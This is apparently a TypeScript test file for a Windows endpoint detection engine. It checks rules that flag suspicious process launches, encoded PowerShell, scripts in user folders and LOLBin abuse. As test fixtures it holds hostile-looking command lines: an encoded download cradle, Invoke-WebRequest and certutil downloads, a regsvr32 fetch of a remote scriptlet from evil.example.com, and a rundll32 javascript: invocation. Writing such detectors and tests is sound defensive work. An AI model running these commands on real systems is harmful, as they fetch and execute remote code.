import { describe, it } from "node:test";
import assert from "node:assert/strict";
import type { SecurityEvent } from "../types";
import { evaluateRules, RULES, RULE_CATALOG } from "../rules";

function makeEvent(overrides: Partial<SecurityEvent> = {}): SecurityEvent {
  return {
    id: "evt-1",
    type: "PROCESS_CREATED",
    origin: "created",
    timestamp: "2026-01-01T12:00:00.000Z",
    source: "windows_process_monitor",
    hostname: "test-host",
    pid: 4242,
    process_name: "powershell.exe",
    executable_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    command_line: null,
    parent_pid: null,
    parent_process_name: null,
    username: null,
    metadata: {},
    ...overrides,
  };
}

const PROC_001 = "PROC-001-SUSPICIOUS-PARENT-CHILD";
const PROC_002 = "PROC-002-ENCODED-COMMAND-LINE";
const PROC_003 = "PROC-003-INTERPRETER-UNUSUAL-SCRIPT";
const PROC_004 = "PROC-004-UNUSUAL-LOCATION";
const PROC_005 = "PROC-005-INTERPRETER-CHAIN";
const PROC_006 = "PROC-006-DOWNLOAD-EXECUTE";
const PROC_007 = "PROC-007-LOLBIN-EXECUTION";

describe("RULE_CATALOG", () => {
  it("exposes one entry per rule with unique ids", () => {
    assert.equal(RULE_CATALOG.length, RULES.length);
    const ids = new Set(RULE_CATALOG.map((r) => r.rule_id));
    assert.equal(ids.size, RULES.length);
  });
});

describe("PROC-001 suspicious parent-child", () => {
  it("flags a productivity app spawning PowerShell", () => {
    const m = evaluateRules(
      makeEvent({
        pid: 9001,
        process_name: "powershell.exe",
        parent_pid: 100,
        parent_process_name: "winword.exe",
      }),
    ).find((x) => x.rule_id === PROC_001);
    assert.ok(m);
    assert.equal(m.baseSeverity, "high");
    assert.ok(m.evidence.some((e) => e.key === "parent_category"));
  });

  it("flags an interpreter spawning a LOLBin", () => {
    const m = evaluateRules(
      makeEvent({
        pid: 9002,
        process_name: "certutil.exe",
        parent_pid: 200,
        parent_process_name: "cmd.exe",
      }),
    ).find((x) => x.rule_id === PROC_001);
    assert.ok(m);
    assert.equal(m.baseSeverity, "medium");
  });

  it("does not fire for non-productivity parents or non-interpreter/lolbin children", () => {
    assert.equal(
      evaluateRules(makeEvent({ parent_process_name: "explorer.exe", process_name: "notepad.exe" })).some((x) => x.rule_id === PROC_001),
      false,
    );
    assert.equal(
      evaluateRules(makeEvent({ parent_process_name: "winword.exe", process_name: "dropbox.exe" })).some((x) => x.rule_id === PROC_001),
      false,
    );
  });

  it("does not fire for snapshot-origin telemetry", () => {
    assert.equal(
      evaluateRules(
        makeEvent({ origin: "snapshot", parent_process_name: "winword.exe", process_name: "powershell.exe" }),
      ).some((x) => x.rule_id === PROC_001),
      false,
    );
  });
});

describe("PROC-002 encoded command line", () => {
  it("flags EncodedCommand with a long Base64 payload", () => {
    const m = evaluateRules(
      makeEvent({
        command_line: 'powershell -nop -enc SQBFAFgAIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA',
      }),
    ).find((x) => x.rule_id === PROC_002);
    assert.ok(m);
    assert.equal(m.baseSeverity, "high");
    assert.ok(m.evidence.some((e) => e.key === "encoded_command"));
    assert.ok(m.evidence[0].detail);
  });

  it("flags hidden window + execution policy bypass", () => {
    const m = evaluateRules(
      makeEvent({ command_line: 'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File run.ps1' }),
    ).find((x) => x.rule_id === PROC_002);
    assert.ok(m);
    assert.equal(m.baseSeverity, "medium");
  });

  it("does not fire for a clean command line", () => {
    assert.equal(
      evaluateRules(makeEvent({ command_line: 'taskschd.msc /s' })).some((x) => x.rule_id === PROC_002),
      false,
    );
  });

  it("does not fire when there is no command line", () => {
    assert.equal(
      evaluateRules(makeEvent({ command_line: null })).some((x) => x.rule_id === PROC_002),
      false,
    );
  });
});

describe("PROC-003 interpreter unusual script", () => {
  it("flags a script in a user-writable directory", () => {
    const m = evaluateRules(
      makeEvent({
        command_line: 'powershell.exe -File "C:\\Users\\mira\\AppData\\Local\\Temp\\ps_8F2A.ps1"',
      }),
    ).find((x) => x.rule_id === PROC_003);
    assert.ok(m);
    assert.equal(m.baseSeverity, "high");
    assert.ok(m.evidence.some((e) => e.key === "script_path"));
    assert.match(m.evidence[0].detail ?? "", /Temp/);
  });

  it("flags a script directly under a user-writable root", () => {
    const m = evaluateRules(
      makeEvent({ command_line: 'cscript.exe "C:\\Temp\\run.vbs"' }),
    ).find((x) => x.rule_id === PROC_003);
    assert.ok(m);
  });

  it("does not fire for a script in a system directory", () => {
    assert.equal(
      evaluateRules(
        makeEvent({ command_line: 'powershell.exe -File "C:\\Windows\\System32\\Scripts\\clean.ps1"' }),
      ).some((x) => x.rule_id === PROC_003),
      false,
    );
  });

  it("does not fire for non-interpreter processes", () => {
    assert.equal(
      evaluateRules(
        makeEvent({ process_name: "notepad.exe", command_line: 'notepad.exe "C:\\Users\\mira\\Documents\\notes.txt"' }),
      ).some((x) => x.rule_id === PROC_003),
      false,
    );
  });
});

describe("PROC-004 unusual location", () => {
  it("flags a PowerShell binary running from Downloads", () => {
    const m = evaluateRules(
      makeEvent({
        process_name: "powershell.exe",
        executable_path: "C:\\Users\\mira\\Downloads\\powershell.exe",
      }),
    ).find((x) => x.rule_id === PROC_004);
    assert.ok(m);
    assert.equal(m.baseSeverity, "high");
    assert.ok(m.evidence.some((e) => e.key === "executable_path"));
  });

  it("does not fire for a normal System32 path", () => {
    assert.equal(
      evaluateRules(
        makeEvent({ executable_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" }),
      ).some((x) => x.rule_id === PROC_004),
      false,
    );
  });

  it("does not fire for a user-writable path of a non-lolbin non-interpreter", () => {
    assert.equal(
      evaluateRules(
        makeEvent({ process_name: "dropbox.exe", executable_path: "C:\\Users\\mira\\Downloads\\dropbox.exe" }),
      ).some((x) => x.rule_id === PROC_004),
      false,
    );
  });
});

describe("PROC-005 interpreter chain", () => {
  it("flags cmd spawning powershell", () => {
    const m = evaluateRules(
      makeEvent({
        pid: 7001,
        process_name: "powershell.exe",
        parent_pid: 7000,
        parent_process_name: "cmd.exe",
      }),
    ).find((x) => x.rule_id === PROC_005);
    assert.ok(m);
    assert.equal(m.baseSeverity, "medium");
  });

  it("does not fire for snapshot-origin telemetry", () => {
    assert.equal(
      evaluateRules(
        makeEvent({ origin: "snapshot", process_name: "powershell.exe", parent_process_name: "cmd.exe" }),
      ).some((x) => x.rule_id === PROC_005),
      false,
    );
  });
});

describe("PROC-006 download-and-execute", () => {
  it("flags Invoke-WebRequest with -OutFile", () => {
    const m = evaluateRules(
      makeEvent({
        command_line: 'powershell.exe -Command "Invoke-WebRequest -Uri http://cdn.example.com/a.ps1 -OutFile C:\\Users\\mira\\AppData\\Local\\Temp\\a.ps1"',
      }),
    ).find((x) => x.rule_id === PROC_006);
    assert.ok(m);
    assert.equal(m.baseSeverity, "high");
    assert.ok(m.evidence.some((e) => e.key === "download_marker"));
  });

  it("flags certutil urlcache download", () => {
    const m = evaluateRules(
      makeEvent({ process_name: "certutil.exe", command_line: "certutil.exe -urlcache -split -f http://evil.example.com/pay.exe pay.exe" }),
    ).find((x) => x.rule_id === PROC_006);
    assert.ok(m);
  });

  it("does not fire without a command line or markers", () => {
    assert.equal(
      evaluateRules(makeEvent({ command_line: "whoami" })).some((x) => x.rule_id === PROC_006),
      false,
    );
    assert.equal(
      evaluateRules(makeEvent({ command_line: null })).some((x) => x.rule_id === PROC_006),
      false,
    );
  });
});

describe("PROC-007 LOLBin abuse", () => {
  it("flags regsvr32 scrobj.dll registration", () => {
    const m = evaluateRules(
      makeEvent({ process_name: "regsvr32.exe", command_line: 'regsvr32.exe /s /i:http://evil.example.com/s.sct scrobj.dll' }),
    ).find((x) => x.rule_id === PROC_007);
    assert.ok(m);
    assert.equal(m.baseSeverity, "high");
    assert.ok(m.evidence.some((e) => e.key === "lolbin_use"));
  });

  it("flags rundll32 javascript: execution", () => {
    const m = evaluateRules(
      makeEvent({ process_name: "rundll32.exe", command_line: 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)' }),
    ).find((x) => x.rule_id === PROC_007);
    assert.ok(m);
  });

  it("does not fire for a LOLBin without abuse arguments", () => {
    assert.equal(
      evaluateRules(makeEvent({ process_name: "whoami.exe", command_line: "whoami.exe /all" })).some((x) => x.rule_id === PROC_007),
      false,
    );
  });
});

describe("evaluateRules combination", () => {
  it("produces multiple independent matches for a compound event", () => {
    const detections = evaluateRules(
      makeEvent({
        executable_path: "C:\\Users\\mira\\Downloads\\powershell.exe",
        command_line: 'powershell.exe -enc SQBFAFgAIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA=',
      }),
    );
    const ids = new Set(detections.map((m) => m.rule_id));
    assert.ok(ids.has(PROC_002), "encoded command should fire");
    assert.ok(ids.has(PROC_004), "unusual location should fire");
  });

  it("does not throw for events with missing fields", () => {
    const m = evaluateRules(makeEvent({ process_name: "", parent_process_name: undefined }));
    assert.ok(Array.isArray(m));
  });
});